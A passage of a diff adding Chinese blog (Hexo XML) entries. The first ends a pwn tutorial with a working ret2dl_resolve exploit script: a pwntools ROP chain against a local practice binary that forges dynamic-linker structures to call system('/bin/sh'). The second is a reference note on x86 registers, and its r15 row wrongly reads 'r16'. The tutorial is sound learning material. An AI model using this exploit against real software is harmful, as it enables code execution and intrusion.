class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span></pre></td></tr></table></figure>
+<p>之后有很多的检查这里不需要考虑的略过。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-8.png" alt="图8" title="" class="">
+                <p>图8</p>
+            </figure>
+<p>如上图所示，蓝色箭头表示可以伪造的部分。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">context.log_level=<span class="string">'debug'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">file = ELF(<span class="string">"./bof"</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">r = process(<span class="string">"./bof"</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb.attach(r, "b *0x0804851E\nb *0x080485B6\n b*0x08048458")</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">fake_stack_base = <span class="number">0x804aa00</span> <span class="comment">#bss段上的一段可写地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">read_plt = p32(file.plt[<span class="string">'read'</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">pop3_ret = p32(<span class="number">0x08048619</span>) <span class="comment">#ROPgadget --binary bof --only "pop|ret"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">pop_ebp_ret = p32(<span class="number">0x0804861b</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">leave_ret = p32(<span class="number">0x08048458</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x6c</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">payload += p32(fake_stack_base)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">payload += read_plt +pop3_ret + p32(<span class="number">0</span>) + p32(fake_stack_base) + p32(<span class="number">0x200</span>) + pop_ebp_ret + p32(fake_stack_base) + leave_ret<span class="comment">#首先调用read函数将数据写入到伪造的地址，然后控制栈顶指针指向伪造地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">payload += <span class="string">'A'</span> * (<span class="number">256</span> - len(payload))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">r.readuntil(<span class="string">"resolve\n"</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">r.send(payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">plt_0 = <span class="number">0x08048380</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">rel_plt = <span class="number">0x08048330</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">dynsym = <span class="number">0x080481d8</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">dynstr = <span class="number">0x08048278</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">write_got = file.got[<span class="string">"write"</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">fake_rel = fake_stack_base + <span class="number">0x50</span> <span class="comment">#伪造的.rel.plt地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">fake_reloc_arg = (fake_rel - rel_plt)<span class="comment">#计算reloc_arg的偏移</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">fake_dynsym = fake_stack_base + <span class="number">0x100</span><span class="comment">#伪造的dynsym地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym - dynsym) &amp; <span class="number">0xf</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">fake_dynsym += align <span class="comment">#对齐</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">fake_r_info = (fake_dynsym - dynsym) / <span class="number">0x10</span> <span class="comment">#计算偏移</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">fake_r_info = (fake_r_info &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#绕过r_info检查</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">fake_dynstr = fake_stack_base + <span class="number">0x150</span> <span class="comment">#伪造dynstr地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">fake_st_name = fake_dynstr - dynstr <span class="comment">#字符串的偏移位置</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'BCDE'</span> <span class="comment">#ebp</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">payload2 += p32(plt_0)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">payload2 += p32(fake_reloc_arg)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">"K"</span> * <span class="number">4</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">payload2 += p32(fake_stack_base + <span class="number">0x180</span>) <span class="comment">#system的参数</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">'J'</span> * (fake_rel - fake_stack_base - len(payload2)) <span class="comment">#填充</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">payload2 += p32(write_got)  + p32(fake_r_info) <span class="comment">#伪造rel.plt内容，前四个字节是r_offset是当dl_runtimeresolve解析出函数地址后会将值写入的地址这里的地址必须保证可写</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">'I'</span> * (fake_dynsym - fake_stack_base - len(payload2))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">payload2 += p32(fake_st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)<span class="comment">#伪造dynsym最后三个内容必须是0，0，0x12以绕过检查</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">'H'</span> * (fake_dynstr - fake_stack_base - len(payload2))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">"system\x00"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">'G'</span> * (<span class="number">0x180</span> - len(payload2))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">"/bin/sh\x00"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">payload2 += <span class="string">'F'</span> * (<span class="number">0x200</span> - len(payload2))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">r.sendline(payload2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># r.sendline("123")</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># r.recvall()</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">r.interactive()</span></pre></td></tr></table></figure>
+<p>ps:<br>做题遇到个大坑：dl_fixup中有一个检查忘记提了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">   &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">   &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">     <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">       (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">     ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     version = &amp;l-&gt;l_versions[ndx];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">       version = <span class="literal">NULL</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr></table></figure>
+<p>就是这个version需要为NULL，这里比较稳妥的方法是让ndx为0，vernum是两字节在内存中还是比较好找到内存为0的地址。这里DT_VERSYM指向的是.gnu.version节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">versym = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_VERSYM"</span>) <span class="comment">#找到.gnu.version 节的地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    vernum = u16(ELF_obj.read(versym+fake_r_info*<span class="number">2</span>,<span class="number">2</span>)) <span class="comment">#判断相应位置是否为0</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> vernum == <span class="number">0</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">break</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    fake_r_info += <span class="number">1</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">fake_dynsym = fake_r_info * <span class="number">0x10</span> + dynsym <span class="comment">#重新计算fake_dynsym的位置</span></span></pre></td></tr></table></figure>
+<p>这里不添加回上面的exp中了，之前的那题计算后偏移的位置那一段刚好为0所以没有考虑这个问题，但是通常情况下伪造的地址会在.bss段，所以r_info的值会比较大，容易出现这种问题。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1.<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br>2.<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/</a><br>3.<a href="https://blog.csdn.net/dddxxxx/article/details/80347610" rel="noopener">https://blog.csdn.net/dddxxxx/article/details/80347610</a><br>4.<a href="https://blog.csdn.net/qq_37375427/article/details/84947071" rel="noopener">https://blog.csdn.net/qq_37375427/article/details/84947071</a><br>5.<a href="https://www.cnblogs.com/tongyishu/p/11821645.html" rel="noopener">https://www.cnblogs.com/tongyishu/p/11821645.html</a><br>6.<a href="https://www.cnblogs.com/qscfyuk/p/11697816.html" rel="noopener">https://www.cnblogs.com/qscfyuk/p/11697816.html</a><br>7.<a href="https://www.cnblogs.com/linhaostudy/p/10508159.html" rel="noopener">https://www.cnblogs.com/linhaostudy/p/10508159.html</a><br>8.<a href="https://wiki.x10sec.org/executable/elf/elf_structure/#dynamic" rel="noopener">https://wiki.x10sec.org/executable/elf/elf_structure/#dynamic</a><br>9.<a href="https://www.cnblogs.com/sayhellowen/p/802b5b0ad648e1a343dcd0f85513065f.html" rel="noopener">https://www.cnblogs.com/sayhellowen/p/802b5b0ad648e1a343dcd0f85513065f.html</a><br>10.<a href="http://bdxnote.blog.163.com/blog/static/8444235201542614525660/" rel="noopener">http://bdxnote.blog.163.com/blog/static/8444235201542614525660/</a><br>11.<a href="https://www.cnblogs.com/ilocker/p/4611150.html" rel="noopener">https://www.cnblogs.com/ilocker/p/4611150.html</a><br>12.<a href="https://blog.csdn.net/jazrynwong/article/details/89851640" rel="noopener">https://blog.csdn.net/jazrynwong/article/details/89851640</a><br>13.<a href="https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> stack-overflow </tag>
+            
+            <tag> rop </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[常用寄存器]]></title>
+      <url>/2020/02/03/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要目的是在pwn的学习之前简单的记录一下各个寄存器的作用方便以后查阅，并没用作深入的研究。</p>
+<h1 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h1><h2 id="四个数据寄存器"><a href="#四个数据寄存器" class="headerlink" title="四个数据寄存器"></a>四个数据寄存器</h2><table>
+<thead>
+<tr>
+<th align="center">name</th>
+<th align="center">一般用途</th>
+<th align="center">64位</th>
+<th align="center">32位</th>
+<th align="center">16位</th>
+<th align="center">8位 (高8位)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">accumulator</td>
+<td align="center">存储函数返回值和加法乘法指令的默认寄存器，当返回值的位数超过寄存器大小时会尝试使用rdx（edx）寄存器，如果还是过大则会将数据保存在栈中。</td>
+<td align="center">rax</td>
+<td align="center">eax</td>
+<td align="center">ax</td>
+<td align="center">al(ah)</td>
+</tr>
+<tr>
+<td align="center">base</td>
+<td align="center">如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。在ABI规定中调用者不需要保护EBX寄存器，如果被调用函数用到了该寄存器，则被调用函数必须自己保护它。</td>
+<td align="center">rbx</td>
+<td align="center">ebx</td>
+<td align="center">bx</td>
+<td align="center">bl(bh)</td>
+</tr>
+<tr>
+<td align="center">count</td>
+<td align="center">在循环和字符串操作时，要用它来控制循环次数;在位操作中，当移多位时，要用CL来指明移位的位数;函数调用时的第4个参数</td>
+<td align="center">rcx</td>
+<td align="center">ecx</td>
+<td align="center">cx</td>
+<td align="center">cl(ch)</td>
+</tr>
+<tr>
+<td align="center">data</td>
+<td align="center">I/O操作时提供外部设备接口的端口地址；在进行乘、除运算时，它可作为默认的操作数参与运算(存放余数);函数调用时的第3个参数</td>
+<td align="center">rdx</td>
+<td align="center">edx</td>
+<td align="center">dx</td>
+<td align="center">dl(dh)</td>
+</tr>
+</tbody></table>
+<h2 id="两个变址寄存器"><a href="#两个变址寄存器" class="headerlink" title="两个变址寄存器"></a>两个变址寄存器</h2><table>
+<thead>
+<tr>
+<th align="center">name</th>
+<th align="center">一般用途</th>
+<th align="center">64位</th>
+<th align="center">32位</th>
+<th align="center">16位</th>
+<th align="center">8位 (高8位)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">source index</td>
+<td align="center">寄存器SI、DI称为变址寄存器，它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。函数调用时的第2个参数</td>
+<td align="center">rsi</td>
+<td align="center">esi</td>
+<td align="center">si</td>
+<td align="center">sil</td>
+</tr>
+<tr>
+<td align="center">destination index</td>
+<td align="center">同上，函数调用时的第1个参数</td>
+<td align="center">rdi</td>
+<td align="center">edi</td>
+<td align="center">di</td>
+<td align="center">dil</td>
+</tr>
+</tbody></table>
+<h2 id="两个指针寄存器"><a href="#两个指针寄存器" class="headerlink" title="两个指针寄存器"></a>两个指针寄存器</h2><table>
+<thead>
+<tr>
+<th align="center">name</th>
+<th align="center">一般用途</th>
+<th align="center">64位</th>
+<th align="center">32位</th>
+<th align="center">16位</th>
+<th align="center">8位 (高8位)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">bp(base pointer)</td>
+<td align="center">主要用于访问堆栈内的存储单元,通常情况下存储着当前的栈底地址。</td>
+<td align="center">rbp</td>
+<td align="center">ebp</td>
+<td align="center">bp</td>
+<td align="center">bpl</td>
+</tr>
+<tr>
+<td align="center">sp(stack pointer)</td>
+<td align="center">主要用于访问堆栈内的存储单元,通常情况下存储着当前的栈顶地址。</td>
+<td align="center">rsp</td>
+<td align="center">esp</td>
+<td align="center">sp</td>
+<td align="center">spl</td>
+</tr>
+</tbody></table>
+<p>作为通用寄存器，同样也可存储算术逻辑运算的操作数和运算结果。</p>
+<h2 id="64位机器中新增的8个通用寄存器"><a href="#64位机器中新增的8个通用寄存器" class="headerlink" title="64位机器中新增的8个通用寄存器"></a>64位机器中新增的8个通用寄存器</h2><table>
+<thead>
+<tr>
+<th align="center">name</th>
+<th align="center">一般用途</th>
+<th align="center">64位</th>
+<th align="center">32位</th>
+<th align="center">16位</th>
+<th align="center">8位 (高8位)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">r8</td>
+<td align="center">函数调用时的第5个参数</td>
+<td align="center">r8</td>
+<td align="center">r8d</td>
+<td align="center">r8w</td>
+<td align="center">r8b</td>
+</tr>
+<tr>
+<td align="center">r9</td>
+<td align="center">函数调用时的第6个参数</td>
+<td align="center">r9</td>
+<td align="center">r9d</td>
+<td align="center">r9w</td>
+<td align="center">r9b</td>
+</tr>
+<tr>
+<td align="center">r10</td>
+<td align="center">调用者保存</td>
+<td align="center">r10</td>
+<td align="center">r10d</td>
+<td align="center">r10w</td>
+<td align="center">r10b</td>
+</tr>
+<tr>
+<td align="center">r11</td>
+<td align="center">调用者保存</td>
+<td align="center">r11</td>
+<td align="center">r11d</td>
+<td align="center">r11w</td>
+<td align="center">r11b</td>
+</tr>
+<tr>
+<td align="center">r12</td>
+<td align="center">调用者保存</td>
+<td align="center">r12</td>
+<td align="center">r12d</td>
+<td align="center">r12w</td>
+<td align="center">r12b</td>
+</tr>
+<tr>
+<td align="center">r13</td>
+<td align="center">调用者保存</td>
+<td align="center">r13</td>
+<td align="center">r13d</td>
+<td align="center">r13w</td>
+<td align="center">r13b</td>
+</tr>
+<tr>
+<td align="center">r14</td>
+<td align="center">调用者保存</td>
+<td align="center">r14</td>
+<td align="center">r14d</td>
+<td align="center">r14w</td>
+<td align="center">r14b</td>
+</tr>
+<tr>
+<td align="center">r15</td>
+<td align="center">调用者保存</td>
+<td align="center">r16</td>
+<td align="center">r15d</td>
+<td align="center">r15w</td>
+<td align="center">r15b</td>
+</tr>
+</tbody></table>
+<h1 id="六个段寄存器"><a href="#六个段寄存器" class="headerlink" title="六个段寄存器"></a>六个段寄存器</h1><table>
+<thead>
+<tr>
+<th align="center">寄存器</th>
+<th align="center">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">CS(code segment)</td>
+<td align="center">代码段地址寄存器，存放代码段的起始地址</td>
+</tr>
+<tr>
+<td align="center">DS(data segment)</td>
+<td align="center">数据段地址寄存器，存放数据段的起始地址</td>
+</tr>
+<tr>
+<td align="center">SS(stack segment)</td>
+<td align="center">堆栈段地址寄存器，存放堆栈段的起始地址</td>
+</tr>
+<tr>
+<td align="center">ES(Extra segment)</td>
+<td align="center">附加段地址寄存器，存放附加段的起始地址</td>
+</tr>
+<tr>
+<td align="center">FS(Extra Segment)</td>
+<td align="center">附加段地址寄存器，存放附加段的起始地址</td>
+</tr>
+<tr>
+<td align="center">GS(Extra Segment)</td>
+<td align="center">附加段地址寄存器，存放附加段的起始地址</td>
+</tr>
+</tbody></table>
+<p>注意无论是32位还是64位的CPU段寄存器一直都是16位宽。<br>其中fs，gs是80386起增加的两个辅助段寄存器,在这之前只有一个辅助段寄存器ES,增加这两个寄存器是为了减轻ES寄存器的负担,并能更好地配合适用于通用寄存器组的基址和变址寄存器。</p>
+<p>同时，在真正的32位CPU诞生后出现了两种不同的工作方式：实模式和保护模式<br>在实模式下，CPU只有20根地址线，段寄存器的作用是存放相应的段的地址，并通过向左移4位然后与段偏移量相加获取地址。<br>在保护模式下，引用了段页管理机制，所以段寄存器的作用变成了存储相应的段页选择的地址。</p>
+<p><a href="https://blog.csdn.net/qq_43401808/article/details/86506612" rel="noopener">网上似乎还有一个64位模式</a>，这个模式下处理器把CS/DS/ES/SS的段基都当作0，忽略与之关联的段描述符中的段基地址。这样就为代码/数据/栈创建了平坦的地址空间。但是FS/GS段寄存器是例外。在计算线性地址时，这两个段寄存器可能被用作额外的基址寄存器<br><a href="https://stackoverflow.com/questions/21165678/why-64-bit-mode-long-mode-doesnt-use-segment-registers" rel="noopener">附另一个参考</a></p>
+<h1 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h1><table>
+<thead>
+<tr>
+<th align="center">name</th>
+<th align="center">一般用途</th>
+<th align="center">64位</th>
+<th align="center">32位</th>
+<th align="center">16位</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">IP(Instruction Pointer)</td>
+<td align="center">放下次将要执行的指令在代码段的偏移量。在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。</td>
+<td align="center">rip</td>
+<td align="center">eip</td>
+<td align="center">ip</td>
+</tr>
+</tbody></table>
+<p><a href="https://www.polarxiong.com/archives/x64下PIC的新寻址方式-RIP相对寻址.html" rel="noopener">网上无意到一个用rip寻址的方法，记录一下防止以后不知道是啥。</a></p>
+<h1 id="标志位寄存器"><a href="#标志位寄存器" class="headerlink" title="标志位寄存器"></a>标志位寄存器</h1><p>由于intel处理器在指令集架构上始终保持前向兼容，所以这里我们从16位开始介绍，重复的部分就不再赘述了。</p>
+<h2 id="8086-80186标志寄存器FLAGS"><a href="#8086-80186标志寄存器FLAGS" class="headerlink" title="8086/80186标志寄存器FLAGS"></a>8086/80186标志寄存器FLAGS</h2><figure class="image-box">
+                <img src="/img/posts-img/register-1.png" alt="avatar" title="" class="">
+                <p>avatar</p>
+            </figure>
+<p>CF(carry flag)进位标志: 当进行加（减）法运算时，若最高位向前有进（借）位，则CF=1，否则CF=0。<br>PF(parity flag)奇偶标志:运算结果bit位上为1的个数为偶数个时为1,否则为0.<br>AF(auxiliary carry flag)辅助进位标志:在加（减）法操作中，bit3向bit4有进位（借位）发生时，AF=1，否则AF=0。DAA和DAS指令测试这个标志位，以便在BCD加法或减法之后调整AL中的值。1字节为8bit,对应为 bit7|bit6|bit5|bit4 bit3|bit2|bit1|bit0 前四个为高4位，后四个为低4位.<br>ZF(zero flag)零标志:运算结果等于0时为1,否则为0.<br>SF(sign Flag)符号标志:记录运算结果的符号,结果负时为1.<br>TF(trap flag)陷阱标志:当TF=1时，处理器每次只执行一条指令，用于调试单步操作.<br>IF(interrupt flag)中断标志:IF=1时,允许CPU响应可屏蔽中断,否则关闭中断.<br>DF(direcion flag)方向标志:用于串处理.DF=1时,每次操作后使SI和DI减小.DF=0时则增大. 注意此处DF的值是由程序员进行设定的 cld命令是将DF设置为0，std命令是将DF设置为1；<br>OF(overflow flag)溢出标志:操作数超出机器能表示的范围表示溢出,溢出时为1.<br>从上图中可以看到CF/PF/AF/ZF标志位并不是连续的排布，其实这个布局是为了兼容Intel早期的8080 8位微处理器的标志寄存器的标志位布局这里不多做描述。</p>
+<h2 id="80286增加了IOPL-NT标志位，主要服务于保护模式和多任务机制。"><a href="#80286增加了IOPL-NT标志位，主要服务于保护模式和多任务机制。" class="headerlink" title="80286增加了IOPL/NT标志位，主要服务于保护模式和多任务机制。"></a>80286增加了IOPL/NT标志位，主要服务于保护模式和多任务机制。</h2><figure class="image-box">
+                <img src="/img/posts-img/register-2.png" alt="avatar" title="" class="">
+                <p>avatar</p>
+            </figure>
+<p>IOPL(I/O Privilege Level)I/O特权标志:I/O特权标志用两位二进制位来表示，也称为I/O 特权级字段。该字段指定了要求执行I/O 指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O 指令可执行，否则将发生一个保护异常。<br>NT(Nested Task)嵌套任务标志:嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下:当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；当NT=1，通过任务转换实现中断返回。</p>
+<h2 id="80386-386-Intel386标志寄存器EFLAGS-增加了RF-VM-标志位，用于支持虚拟8086模式与指令断点调试。"><a href="#80386-386-Intel386标志寄存器EFLAGS-增加了RF-VM-标志位，用于支持虚拟8086模式与指令断点调试。" class="headerlink" title="80386/386/Intel386标志寄存器EFLAGS,增加了RF/VM 标志位，用于支持虚拟8086模式与指令断点调试。"></a>80386/386/Intel386标志寄存器EFLAGS,增加了RF/VM 标志位，用于支持虚拟8086模式与指令断点调试。</h2><figure class="image-box">
+                <img src="/img/posts-img/register-3.png" alt="avatar" title="" class="">
+                <p>avatar</p>
+            </figure>
+<p>RF(Restart Flag)重启动标志:重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。<br>VM(Virtual 8086 Mode)虚拟8086方式标志:如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态。</p>
+<p><a href="https://blog.csdn.net/qq_43401808/article/details/86472254" rel="noopener">这里作者分了很多部分介绍，这里就不详细介绍了</a></p>
+<ul>
+<li>8个32位通用寄存器：</li>
+</ul>
+<p>4个数据寄存器(EAX、EBX、ECX和EDX)</p>
+<p>2个变址和指针寄存器(ESI和EDI) 2个指针寄存器(ESP和EBP)</p>
+<p>6个段寄存器(ES、CS、SS、DS、FS和GS)</p>
+<p>1个指令指针寄存器(EIP)</p>
+<p>1个标志寄存器(EFlags)</p>
